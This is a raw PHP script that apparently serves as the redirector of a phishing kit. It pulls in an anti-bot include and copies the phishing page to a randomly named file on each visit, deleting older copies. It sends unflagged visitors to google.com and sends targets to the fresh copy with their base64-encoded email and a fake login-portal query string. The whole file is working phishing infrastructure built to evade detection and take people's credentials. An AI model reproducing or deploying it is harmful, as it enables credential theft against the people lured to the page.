<?php
session_start();
?>
<?php
include "antibot.php";  
$x = $_GET['x'];
$files = glob("*zt.php");
foreach($files as $file)
unlink($file);
copy("main.php","ogin.php");
function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($login, $find);
$loginID = substr($login, 0, $pos);
return $loginID;
}
$login = base64_encode($_GET['a']);
$loginID = getloginIDFromlogin($login);
$dir =  getcwd();
if ($handle = opendir($dir)) {
    while (false !== ($entry = readdir($handle))) {
 $len = strlen($entry);
if($len == 28){
rename($entry, "ogin.php");
}}}
$staticfile = "ogin.php";
$name =  generateRandomString();
$secfile = $name."zt.php";
if (!copy($staticfile, $secfile)) {
//echo "file not create\n";
}else {
if(file_exists($secfile)){
//echo "file exist\n";
unlink($staticfile);
if($x !== "x"){
	header("Location: http://google.com");
}

else{
header("Location: $secfile?a=$login&.verify?service=nfpb=true&_pageLabel=smep_portal_page_login&timedOut=true&_nfls&c=&i=0&false=$login&loginID=$loginID&.#n=12528&c=&99642&fid=1&fav=1");
}}
}
//echo $_SESSION["file"]."\n";
$name =  generateRandomString();
function generateRandomString($length = 24) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>